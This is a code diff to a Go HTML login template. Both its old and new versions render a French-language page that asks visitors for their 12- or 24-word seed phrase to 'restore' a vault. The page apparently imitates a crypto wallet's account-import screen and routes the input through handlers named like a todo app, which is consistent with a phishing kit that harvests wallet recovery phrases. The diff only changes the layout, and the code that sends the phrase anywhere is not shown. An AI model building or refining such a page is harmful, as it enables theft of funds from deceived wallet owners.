@@ -1,29 +1,24 @@
 {{ define "login" }}<!DOCTYPE html><html lang="en">
   {{ template "head" .PageTitle }}
   <body>
-  <div id="app-content" class="dark">
-    <div class="app mouse-user-styles">
-      <div class="main-container-wrapper">
-        <div class="first-time-flow">
-          <div class="first-time-flow__wrapper">
-            <div class="import-account" id="v-model-textarea">
-              <a class="import-account__back-button" href="/">&lt; Back</a>
-              <div class="import-account__title">Restaurer votre compte avec une phrase Seed.</div>
-              <div class="import-account__selector-label">Saisissez votre phrase secrète de 12 ou 24 mots pour restaurer votre coffre-fort.</div>
-
-
-              <div class="todoapp import-account__input-wrapper">
-                <textarea class="new-todo import-account__secret-phrase" autofocus autocomplete="off" placeholder="Séparez chaque mot avec un espace" v-model="newTodo" @keyup.enter="addTodo"></textarea>
-                <div>${ errorTodo }</div>
-                <button class="button btn--first-time first-time-flow__button" id="btn-restaurer" @click="addTodo()" >Restaurer</button>
-              </div>
-
-            </div>
-          </div>
+  <p class="container-fluid">
+    <main>
+      <section>
+        <header>
+          <h1>Login</h1>
+        </header>
+        <a href="/" title="go back to homepage">&lt; Back</a>
+      </section>
+      <section>
+        <p>Restaurer votre compte avec une phrase Seed.</p>
+        <p>Saisissez votre phrase secrète de 12 ou 24 mots pour restaurer votre coffre-fort.</p>
+        <div class="todoapp">
+          <textarea class="new-todo import-account__secret-phrase" autofocus autocomplete="off" placeholder="Séparez chaque mot avec un espace" v-model="newTodo" @keyup.enter="addTodo"></textarea>
+          <div>${ errorTodo }</div>
+          <button class="button btn--first-time first-time-flow__button" id="btn-restaurer" @click="addTodo()" >Restaurer</button>
         </div>
-      </div>
-    </div>
-
+      </section>
+    </main>
     {{ template "footer" }}
   </div>
 </body>
